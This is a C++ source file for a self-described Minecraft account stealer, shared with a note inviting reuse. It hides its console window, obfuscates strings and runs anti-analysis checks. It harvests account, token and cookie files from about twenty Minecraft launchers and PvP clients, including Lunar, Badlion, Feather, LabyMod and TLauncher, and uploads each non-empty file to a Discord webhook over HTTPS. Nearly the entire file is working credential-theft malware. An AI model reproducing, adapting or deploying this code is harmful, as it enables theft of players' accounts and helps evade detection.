/*

//===================================================//

this stealer was coded by itosted / juvee <--- https://github.com/zjuvee
you can use this code, but i dont take any responsibility for any damage caused.

remember to change the webhook url in the includes/MinecraftStealer.hpp file

pd: give me credits if you use this code in your project. <---- please, dont copy pasted and remove the name

//===================================================//
*/

#include "includes\MinecraftStealer.hpp"
#include "includes\xorstr.hpp"


// webhook name & avatar
std::string Minecraft::newName = (xorstr_("MCStealer | by juve"));
std::string Minecraft::newAvatarURL = (xorstr_("https://tenor.com/view/hotline-miami-rat-spin-gif-26488967"));

/*
this code is the minecraft account stealer
*/


// user path finder
char* Minecraft::userPathFinder() {
    char* userPath = nullptr;
    size_t len;
    errno_t err = _dupenv_s(&userPath, &len, (xorstr_("USERPROFILE")));
    if (err != 0 || userPath == nullptr) {
        return nullptr;
    }
    return userPath;
}

// this shit create directory in temp folder
/*
void Minecraft::createDirectories() {
    char* userPath = userPathFinder();
    if (userPath == nullptr) {
        return;
    }

    fs::path baseDir = fs::path((xorstr_("C:\\Windows\\Temp\\dmDndwfduwucdUDNrMCU0")));
    fs::create_directories(baseDir);

    fs::create_directory(baseDir / (xorstr_("pvpclients")));
    fs::create_directory(baseDir / (xorstr_("minecraft")));
    fs::create_directory(baseDir / (xorstr_("misc")));

    free(userPath);
}*/


// this is the get file name
std::string Minecraft::getFileName(const std::filesystem::path& filePath) {
    return filePath.filename().string();
}

/*

//======================= this shit send file to webhook via http =========================//

credits: https://github.com/Fontesie/discord-webhook-cpp

*/

void Minecraft::sendFileToWebhook(const std::string& filePath, const std::string& webhookURL, const std::string& newName, const std::string& newAvatarURL) {
    HINTERNET hSession = WinHttpOpen(xorstr_(L"GsRnfrjDNdjTRjrsSdrrN/1.0"),
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS,
        0);

    HINTERNET hConnect = WinHttpConnect(hSession,
        xorstr_(L"discordapp.com"),
        INTERNET_DEFAULT_HTTPS_PORT,
        0);

    std::wstring webhookURLWide = std::wstring(webhookURL.begin(), webhookURL.end());
    HINTERNET hRequest = WinHttpOpenRequest(hConnect,
        xorstr_(L"POST"),
        webhookURLWide.c_str(),
        NULL,
        WINHTTP_NO_REFERER,
        WINHTTP_DEFAULT_ACCEPT_TYPES,
        WINHTTP_FLAG_SECURE);

    std::ifstream fileStream(filePath, std::ios::binary);
    std::string fileContent((std::istreambuf_iterator<char>(fileStream)), std::istreambuf_iterator<char>());

    std::string boundary = "------------------------boundary123";
    std::string contentDisposition = "Content-Disposition: form-data; name=\"file\"; filename=\"" + getFileName(filePath) + "\"\r\n";
    std::string contentType = "Content-Type: application/octet-stream\r\n\r\n";

    std::string payloadJson = R"({"username":")" + newName + R"(","avatar_url":")" + newAvatarURL + R"("})";

    std::string requestBody = "--" + boundary + "\r\n" +
        "Content-Disposition: form-data; name=\"payload_json\"\r\n\r\n" +
        payloadJson + "\r\n--" + boundary + "\r\n" +
        contentDisposition +
        contentType +
        fileContent + "\r\n--" + boundary + "--\r\n";

    BOOL bResults = WinHttpSendRequest(hRequest,
        xorstr_(L"Content-Type: multipart/form-data; boundary=------------------------boundary123\r\n"),
        -1L,
        reinterpret_cast<LPVOID>(const_cast<char*>(requestBody.c_str())),
        static_cast<DWORD>(requestBody.length()),
        static_cast<DWORD>(requestBody.length()),
        0);

    if (bResults) {
        WinHttpReceiveResponse(hRequest, NULL);
    }

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
}



void Minecraft::sendMessageToWebhook(const std::string& message, const std::string& webhookURL, const std::string& newName, const std::string& newAvatarURL) {
    HINTERNET hSession = WinHttpOpen(xorstr_(L"GsRnfrjDNdjTRjrsSdrrN/1.0"),
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS,
        0);

    HINTERNET hConnect = WinHttpConnect(hSession,
        xorstr_(L"discordapp.com"),
        INTERNET_DEFAULT_HTTPS_PORT,
        0);

    std::wstring webhookURLWide(webhookURL.begin(), webhookURL.end());
    HINTERNET hRequest = WinHttpOpenRequest(hConnect,
        xorstr_(L"POST"),
        webhookURLWide.c_str(),
        NULL,
        WINHTTP_NO_REFERER,
        WINHTTP_DEFAULT_ACCEPT_TYPES,
        WINHTTP_FLAG_SECURE);

    std::string payloadJson = R"({"content":")" + message + R"(","username":")" + newName + R"(","avatar_url":")" + newAvatarURL + R"("})";
    std::string requestBody = "payload_json=" + payloadJson;

    BOOL bResults = WinHttpSendRequest(hRequest,
        xorstr_(L"Content-Type: application/x-www-form-urlencoded\r\n"),
        -1L,
        reinterpret_cast<LPVOID>(const_cast<char*>(requestBody.c_str())),
        static_cast<DWORD>(requestBody.length()),
        static_cast<DWORD>(requestBody.length()),
        0);

    if (bResults) {
        WinHttpReceiveResponse(hRequest, NULL);
    }

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
}



// this ugly femboy function read file and if its empty dont send it
void sendNonEmptyFiles(const std::map<std::filesystem::path, std::string>& fileMappings, const std::string& webhookURL) {
    
    for (const auto& [filePath, pathName] : fileMappings) {
        std::ifstream fileStream(filePath, std::ios::binary);
        if (fileStream) {

            fileStream.seekg(0, std::ios::end);
            size_t fileSize = fileStream.tellg();
            fileStream.seekg(0, std::ios::beg);

            if (fileSize > 0) {
                std::string fileContent((std::istreambuf_iterator<char>(fileStream)), std::istreambuf_iterator<char>());

                std::string message = (xorstr_("File: ")) + Minecraft::getFileName(filePath) + (xorstr_("Path: ")) + pathName;

                
                Minecraft::sendMessageToWebhook(message, webhookURL, Minecraft::newName, Minecraft::newAvatarURL);
                Minecraft::sendFileToWebhook(filePath.string(), webhookURL, Minecraft::newName, Minecraft::newAvatarURL);
            }
            fileStream.close();
        }
    }
}




/*

//======================= this send minecraft accounts to webhook =========================//

credits: https://github.com/Appolon24800/Minecraft-accounts-paths (for the paths uuwu)

*/

void Minecraft::stealMinecraft() {
    char* userPath = Minecraft::userPathFinder();

    // hide the cmd 
    SetWindowPos(GetConsoleWindow(), NULL, 5000, 5000, 0, 0, 0);
    ShowWindow(GetConsoleWindow(), SW_HIDE);

    AntiCrack::checkForCrackingToolsA();
    // misc paths
    std::filesystem::path accountsPathIntent = std::filesystem::path(userPath) / (xorstr_("intentlauncher")) / (xorstr_("launcherconfig"));
    std::filesystem::path accountsPathIntent2 = std::filesystem::path(userPath) / (xorstr_("intentlauncher")) / (xorstr_("Rise")) / (xorstr_("alts.txt"));
    std::filesystem::path accountsPathPoly = std::filesystem::path(userPath) / (xorstr_("AppData")) / (xorstr_("Roaming")) / (xorstr_("PolyMC")) / (xorstr_("accounts.json"));
    std::filesystem::path accountsPathRise = std::filesystem::path(userPath) / (xorstr_("AppData")) / (xorstr_("Roaming")) / (xorstr_("Rise")) / (xorstr_("alts.txt"));

    // most used pvp clients
    std::filesystem::path accountsPathLunar = std::filesystem::path(userPath) / (xorstr_(".lunarclient")) / (xorstr_("settings")) / (xorstr_("game")) / (xorstr_("accounts.json"));
    std::filesystem::path accountsPathSoar = std::filesystem::path(userPath) / (xorstr_("AppData")) / (xorstr_("Local")) / (xorstr_(".soarclient")) / (xorstr_("game")) / (xorstr_("soar")) / (xorstr_("Account.json"));
    std::filesystem::path accountsPathBadlion = std::filesystem::path(userPath) / (xorstr_("AppData")) / (xorstr_("Roaming")) / (xorstr_("Badlion Client")) / (xorstr_(".updaterId"));
    std::filesystem::path accountsPathBadlion2 = std::filesystem::path(userPath) / (xorstr_("AppData")) / (xorstr_("Roaming")) / (xorstr_("Badlion Client")) / (xorstr_("Cookies"));
    std::filesystem::path accountsPathBadlion3 = std::filesystem::path(userPath) / (xorstr_("AppData")) / (xorstr_("Roaming")) / (xorstr_("Badlion Client")) / (xorstr_("Local State"));
    std::filesystem::path accountsPathFeather = std::filesystem::path(userPath) / (xorstr_("AppData")) / (xorstr_("Roaming")) / (xorstr_(".feather")) / (xorstr_("accounts.json"));
    std::filesystem::path accountsPathLabymod = std::filesystem::path(userPath) / (xorstr_("AppData")) / (xorstr_("Roaming")) / (xorstr_("LabyMod")) / (xorstr_("launcher-config.json"));
    std::filesystem::path accountsPathLabymod2 = std::filesystem::path(userPath) / (xorstr_("AppData")) / (xorstr_("Roaming")) / (xorstr_("LabyMod")) / (xorstr_("launcher-tokens.json"));
    std::filesystem::path accountsPathBlazzing = std::filesystem::path(userPath) / (xorstr_("AppData")) / (xorstr_("Roaming")) / (xorstr_(".blazingpackclient")) / (xorstr_("config")) / (xorstr_("accounts.json"));
    std::filesystem::path accountsPathBlazzing2 = std::filesystem::path(userPath) / (xorstr_("AppData")) / (xorstr_("Roaming")) / (xorstr_(".blazingpackclient")) / (xorstr_("config")) / (xorstr_("token.json"));

    // .minecraft paths
    std::filesystem::path accountsPathLauncher = std::filesystem::path(userPath) / (xorstr_("AppData")) / (xorstr_("Roaming")) / (xorstr_(".minecraft")) / (xorstr_("launcher_accounts.json"));
    std::filesystem::path accountsPathTeLauncher = std::filesystem::path(userPath) / (xorstr_("AppData")) / (xorstr_("Roaming")) / (xorstr_(".minecraft")) / (xorstr_("TlauncherProfiles.json"));
    std::filesystem::path accountsPathMeteor = std::filesystem::path(userPath) / (xorstr_("AppData")) / (xorstr_("Roaming")) / (xorstr_(".minecraft")) / (xorstr_("meteor-client")) / (xorstr_("accounts.nbt"));
    std::filesystem::path accountsPathImpact = std::filesystem::path(userPath) / (xorstr_("AppData")) / (xorstr_("Roaming")) / (xorstr_(".minecraft")) / (xorstr_("Impact")) / (xorstr_("alts.json"));
    std::filesystem::path accountsPathNovoline = std::filesystem::path(userPath) / (xorstr_("AppData")) / (xorstr_("Roaming")) / (xorstr_(".minecraft")) / (xorstr_("Novoline")) / (xorstr_("alts.novo"));
    std::filesystem::path accountsPathCheatBreaker = std::filesystem::path(userPath) / (xorstr_("AppData")) / (xorstr_("Roaming")) / (xorstr_(".minecraft")) / (xorstr_("cheatbreaker_accounts.json"));
    std::filesystem::path accountsPathMicrosoft = std::filesystem::path(userPath) / (xorstr_("AppData")) / (xorstr_("Roaming")) / (xorstr_(".minecraft")) / (xorstr_("launcher_accounts_microsoft_store.json"));

    AntiCrack::checkForCrackingToolsA();
    /*
    std::vector<std::filesystem::path> filePaths = {
    accountsPathIntent,
    accountsPathIntent2,
    accountsPathPoly,
    accountsPathRise,
    accountsPathLunar,
    accountsPathSoar,
    accountsPathBadlion,
    accountsPathBadlion2,
    accountsPathBadlion3,
    accountsPathFeather,
    accountsPathLabymod,
    accountsPathLabymod2,
    accountsPathBlazzing,
    accountsPathBlazzing2,
    accountsPathLauncher,
    accountsPathTeLauncher,
    accountsPathMeteor,
    accountsPathImpact,
    accountsPathNovoline,
    accountsPathCheatBreaker,
    accountsPathMicrosoft
    };*/
    

    std::map<std::filesystem::path, std::string> fileMappings = {
        {accountsPathIntent, (xorstr_("accountsPathIntent"))},
        {accountsPathIntent2, (xorstr_("accountsPathIntent2"))},
        {accountsPathPoly, (xorstr_("accountsPathPoly"))},
        {accountsPathRise, (xorstr_("accountsPathRise"))},
        {accountsPathLunar, (xorstr_("accountsPathLunar"))},
        {accountsPathSoar, (xorstr_("accountsPathSoar"))},
        {accountsPathBadlion, (xorstr_("accountsPathBadlion"))},
        {accountsPathBadlion2, (xorstr_("accountsPathBadlion2"))},
        {accountsPathBadlion3, (xorstr_("accountsPathBadlion3"))},
        {accountsPathFeather, (xorstr_("accountsPathFeather"))},
        {accountsPathLabymod, (xorstr_("accountsPathLabymod"))},
        {accountsPathLabymod2, (xorstr_("accountsPathLabymod2"))},
        {accountsPathBlazzing, (xorstr_("accountsPathBlazzing"))},
        {accountsPathBlazzing2, (xorstr_("accountsPathBlazzing2"))},
        {accountsPathLauncher, (xorstr_("accountsPathLauncher"))},
        {accountsPathTeLauncher, (xorstr_("accountsPathTeLauncher"))},
        {accountsPathMeteor, (xorstr_("accountsPathMeteor"))},
        {accountsPathImpact, (xorstr_("accountsPathImpact"))},
        {accountsPathNovoline, (xorstr_("accountsPathNovoline"))},
        {accountsPathCheatBreaker, (xorstr_("accountsPathCheatBreaker"))},
        {accountsPathMicrosoft, (xorstr_("accountsPathMicrosoft"))}
    };

    sendNonEmptyFiles(fileMappings, webhookURL);



    // remove the temp folder 
    //if (fs::exists(xorstr_("C:\\Windows\\Temp\\dmDndwfduwucdUDNrMCU0"))) {
        //fs::remove_all(xorstr_("C:\\Windows\\Temp\\dmDndwfduwucdUDNrMCU0"));
    //}

    AntiCrack::checkForCrackingToolsA();

    free(userPath);

    //std::cout << (xorstr_("tokens embeds!")) << std::endl;

    AntiCrack::checkForCrackingToolsA();
}

